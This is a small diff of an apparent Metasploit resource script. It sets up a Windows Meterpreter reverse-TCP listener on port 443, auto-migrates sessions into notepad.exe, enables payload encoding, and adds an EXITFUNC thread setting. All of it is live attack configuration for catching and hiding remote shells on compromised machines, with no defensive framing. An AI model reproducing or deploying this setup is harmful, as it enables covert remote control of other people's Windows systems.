@@ -24,6 +24,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 443
 set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
+set EXITFUNC thread
 set EnableUnicodeEncoding true
 set EnableStageEncoding true
 set ExitOnSession false
